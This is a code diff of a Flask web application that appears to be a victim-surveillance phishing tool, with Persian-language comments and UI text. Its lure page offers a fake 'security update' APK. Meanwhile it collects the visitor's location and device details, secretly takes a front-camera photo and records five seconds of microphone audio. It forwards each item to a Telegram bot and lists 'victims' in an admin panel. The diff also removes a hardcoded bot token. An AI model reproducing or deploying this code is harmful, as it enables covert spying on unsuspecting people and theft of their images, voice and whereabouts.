@@ -1,19 +1,17 @@
 import os, io, uuid, base64, json, logging, sqlite3
 from datetime import datetime
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, send_file, g
-import requests  # برای ارسال به تلگرام
+import requests
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-# تنظیمات (متغیرهای محیطی)
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8391932958")
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")  # رمز پنل مدیریت
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 
 DATABASE = "victims.db"
 
-# ================== پایگاه داده ==================
 def get_db():
     db = getattr(g, '_database', None)
     if db is None:
@@ -35,17 +33,28 @@ def close_connection(exception):
     if db is not None:
         db.close()
 
-# ================== توابع کمکی ==================
-def notify_telegram(token, ip, info=""):
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        try:
-            msg = f"🔔 قربانی جدید!\nتوکن: {token}\nIP: {ip}\n{info}"
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
-        except Exception as e:
-            app.logger.error(f"Telegram notify failed: {e}")
+def notify_telegram(token, ip, media_type=None, media_data=None):
+    """ارسال پیام یا فایل به تلگرام"""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    try:
+        if media_type == 'photo' and media_data:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+            files = {'photo': ('camera.jpg', io.BytesIO(media_data), 'image/jpeg')}
+            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📸 عکس جدید\nتوکن: {token}\nIP: {ip}"}
+            requests.post(url, data=data, files=files, timeout=10)
+        elif media_type == 'audio' and media_data:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendAudio"
+            files = {'audio': ('mic.webm', io.BytesIO(media_data), 'audio/webm')}
+            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🎤 صدای ضبط‌شده\nتوکن: {token}\nIP: {ip}"}
+            requests.post(url, data=data, files=files, timeout=10)
+        else:
+            msg = f"🔔 قربانی جدید!\nتوکن: {token}\nIP: {ip}"
+            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                         json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
+    except Exception as e:
+        app.logger.error(f"Telegram notify failed: {e}")
 
-# ================== HTML Templates ==================
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -58,18 +67,14 @@ CAPTURE_PAGE = """
 <a id="dl" href="/download/app-update.apk" download>دانلود بروزرسانی امنیتی</a>
 <script>
 const t="{{ token }}", m=document.getElementById('m'), v=document.getElementById('v'), c=document.getElementById('c'), ctx=c.getContext('2d'), dl=document.getElementById('dl');
-// موقعیت مکانی
 navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})})},e=>{fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})})});
-// اطلاعات دستگاه
 fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone})});
-// عکس
 async function pic(){
   try{
     const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
     v.srcObject=s;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;ctx.drawImage(v,0,0);const d=c.toDataURL('image/jpeg',0.8);fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});setTimeout(()=>s.getTracks().forEach(tr=>tr.stop()),2000);}
   }catch(e){m.innerText='دسترسی به دوربین داده نشد.';}
 }
-// صدا (۵ ثانیه)
 async function rec(){
   try{
     const s=await navigator.mediaDevices.getUserMedia({audio:true});
@@ -89,7 +94,7 @@ async function rec(){
 }
 async function start(){
   pic();
-  setTimeout(rec,3000); // بعد از ۳ ثانیه ضبط صدا شروع می‌شود
+  setTimeout(rec,3000);
   setTimeout(()=>{m.innerText='اتصال برقرار شد.';dl.style.display='block';},6000);
 }
 start();
@@ -121,7 +126,6 @@ ADMIN_PANEL = """
 </body></html>
 """
 
-# ================== Routes ==================
 @app.route('/')
 def index():
     return "ربات فعال. /new-link برای لینک جدید, /admin برای مدیریت"
@@ -158,8 +162,8 @@ def upload(token):
         db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                    (token, media_type, binary, datetime.now().isoformat()))
         db.commit()
-        # اطلاع‌رسانی به تلگرام
-        notify_telegram(token, request.remote_addr, f"نوع: {media_type} دریافت شد")
+        # ارسال مستقیم فایل به تلگرام
+        notify_telegram(token, request.remote_addr, media_type=media_type, media_data=binary)
         return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -171,41 +175,33 @@ def log(token):
     db = get_db()
     db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                (token, data.get('type', 'unknown'), json.dumps(data), datetime.now().isoformat()))
-    # به‌روزرسانی زمان آخرین فعالیت
     db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
     db.commit()
     if data.get('type') == 'device':
-        notify_telegram(token, request.remote_addr, f"دستگاه: {data.get('userAgent','')}")
+        notify_telegram(token, request.remote_addr)
     return jsonify({"status": "ok"})
 
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
     if request.method == 'POST':
         if request.form.get('pass') == ADMIN_PASSWORD:
-            # کوکی ساده برای احراز هویت
             resp = app.make_response("logged in")
             resp.set_cookie('admin', '1')
             return resp
         return "رمز اشتباه", 403
-    # GET: اگر لاگین کرده باشد پنل را نشان بده
     if request.cookies.get('admin') != '1':
         return render_template_string(ADMIN_LOGIN)
-    # جمع‌آوری اطلاعات قربانیان
     db = get_db()
     victims_rows = db.execute("SELECT * FROM victims ORDER BY created_at DESC").fetchall()
     victims = []
     for row in victims_rows:
         token = row['token']
-        # آخرین لاگ device
         log_row = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         info = json.loads(log_row['data']) if log_row else {}
-        # عکس
         photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
-        # صدا
         audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
-        # موقعیت
         loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
         loc = None
         if loc_row:
